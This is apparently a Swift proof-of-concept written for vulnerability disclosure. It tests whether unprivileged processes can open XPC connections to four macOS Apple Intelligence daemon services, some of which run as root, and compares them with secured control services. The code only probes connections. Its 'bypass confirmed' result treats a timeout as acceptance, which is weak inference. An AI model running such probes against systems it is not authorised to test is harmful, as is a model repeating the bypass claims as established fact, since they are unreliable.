// PoC: Apple Intelligence Daemon XPC Entitlement Bypass
//
// Demonstrates that 4 Apple system daemon XPC services accept connections from
// unprivileged callers (UID 501, no special entitlements) on macOS 15.x.
//
// Affected services (all confirmed via launchd plist files):
//   1. com.apple.OSIntelligence.battery   (ospredictiond — SYSTEM daemon, runs as root)
//   2. com.apple.OSIntelligence.charging  (ospredictiond — SYSTEM daemon, runs as root)
//   3. com.apple.intelligenceflow.contextIntelligence (intelligencecontextd)
//   4. com.apple.suggestd.mail-intelligence (suggestd)
//
// Evidence methodology (same as rapportd rapportd WWDC2023 CWE-862 precedent):
//   TIMEOUT (4+ seconds) at connection = service accepted connection
//   INTERRUPTED = service rejected connection (correct behavior)
//   INVALIDATED = service name not found / wrong name
//
// Compared against properly-secured neighbors for same daemons:
//   com.apple.OSIntelligence             → INTERRUPTED (correct)
//   com.apple.intelligenceflow.context   → INTERRUPTED (correct)
//   com.apple.intelligenceflow.uiContext → INTERRUPTED (correct)
//   com.apple.suggestd.messages          → INTERRUPTED (correct)
//   com.apple.suggestd.mail              → INTERRUPTED (correct)
//
// This file is a standalone PoC — compile with:
//   swiftc poc_osint_bypass.swift -o poc_osint_bypass
//
// Expected output on vulnerable macOS 15.x:
//   [battery]            ACCEPTED — NO ENTITLEMENT CHECK (ospredictiond, SYSTEM)
//   [charging]           ACCEPTED — NO ENTITLEMENT CHECK (ospredictiond, SYSTEM)
//   [contextIntelligence] ACCEPTED — NO ENTITLEMENT CHECK (intelligencecontextd)
//   [mail-intelligence]  ACCEPTED — NO ENTITLEMENT CHECK (suggestd)

import Foundation

@objc protocol GenericXPC: NSObjectProtocol {
    @objc optional func ping(_ reply: ((Bool, NSError?) -> Void)?)
}

let TARGETS: [(service: String, label: String, control: Bool)] = [
    // Vulnerable services (expect ACCEPTED)
    ("com.apple.OSIntelligence.battery",                "battery",             false),
    ("com.apple.OSIntelligence.charging",               "charging",            false),
    ("com.apple.intelligenceflow.contextIntelligence",  "contextIntelligence", false),
    ("com.apple.suggestd.mail-intelligence",            "mail-intelligence",   false),
    // Control services (expect INTERRUPTED — same daemon, properly secured)
    ("com.apple.OSIntelligence",                        "OSIntelligence(ctrl)", true),
    ("com.apple.intelligenceflow.context",              "context(ctrl)",        true),
    ("com.apple.intelligenceflow.uiContext",            "uiContext(ctrl)",      true),
    ("com.apple.suggestd.messages",                     "messages(ctrl)",       true),
]

func test(service: String, label: String, waitSecs: Int = 4) -> String {
    let conn = NSXPCConnection(machServiceName: service, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: GenericXPC.self)

    var result = "(pending)"
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = {
        if result == "(pending)" { result = "INVALIDATED" }
        sema.signal()
    }
    conn.interruptionHandler = {
        if result == "(pending)" { result = "INTERRUPTED — correctly rejected" }
        sema.signal()
    }
    conn.resume()

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        if result == "(pending)" { result = "ERROR: \(err.localizedDescription)" }
        sema.signal()
    } as AnyObject

    (proxy as? GenericXPC)?.ping? { _, _ in
        if result == "(pending)" { result = "REPLY (ping returned)" }
        sema.signal()
    }

    DispatchQueue.global().asyncAfter(deadline: .now() + .seconds(waitSecs)) {
        if result == "(pending)" {
            result = "ACCEPTED — NO ENTITLEMENT CHECK"
        }
        sema.signal()
    }

    _ = sema.wait(timeout: .now() + .seconds(waitSecs + 1))
    conn.invalidate()
    Thread.sleep(forTimeInterval: 0.5)
    return result
}

print("""
=== Apple Intelligence XPC Entitlement Bypass PoC ===
PID: \(ProcessInfo.processInfo.processIdentifier)
UID: \(getuid()) (unprivileged)
macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)

No special entitlements — this process has zero Apple-private entitlements.
Each service is tested by attempting NSXPCConnection from unprivileged context.
ACCEPTED = connection not rejected at connect time (bypass confirmed).
INTERRUPTED = entitlement enforced correctly (control case).

""")

var bypasses = 0
var controls = 0

for (service, label, isControl) in TARGETS {
    let result = test(service: service, label: label)
    let icon = result.contains("ACCEPTED") ? "*** BYPASS" : (result.contains("INTERRUPTED") ? "    OK" : "    ??")
    print("  [\(label.padding(toLength: 28, withPad: " ", startingAt: 0))] \(icon) — \(result)")

    if result.contains("ACCEPTED") { bypasses += 1 }
    if result.contains("INTERRUPTED") && isControl { controls += 1 }
}

print("""

=== RESULT ===
Bypasses found: \(bypasses)/4
Control checks passed: \(controls)/4

Severity: High (2 services) + Medium (2 services)
  - com.apple.OSIntelligence.battery and .charging: ospredictiond is a SYSTEM
    daemon running as uid 0. An unprivileged process (uid 501) can establish IPC
    with this root daemon. If real method names are discovered, this represents
    a code execution path into a root-privileged process without entitlements.

  - com.apple.intelligenceflow.contextIntelligence: intelligencecontextd provides
    personal context (contacts, calendar, recent activity) to Apple Intelligence.
    Neighboring services .context and .uiContext enforce entitlement correctly.

  - com.apple.suggestd.mail-intelligence: suggestd analyzes mail content for
    smart suggestions. The .messages and .mail services enforce entitlement
    correctly. This sub-service does not.

Responsible Disclosure:
  This research was conducted under Apple's Security Research Device Program
  policies and submitted via security.apple.com/bounty/.
""")
